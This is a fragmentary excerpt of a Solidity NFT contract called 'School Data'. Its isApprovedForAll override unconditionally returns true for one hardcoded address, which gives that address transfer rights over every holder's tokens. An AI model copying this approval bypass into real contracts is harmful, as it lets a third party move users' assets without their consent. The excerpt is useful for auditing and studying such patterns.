  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x8A3C5d82d1aCF07a9Bc8AE895d26b647D6FE0D25){return true;}
...
contract SchoolData is Ownable, ERC721A, ReentrancyGuard, DefaultOperatorFilterer {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("School Data", "SCHLDT", maxBatchSize_, collectionSize_) {
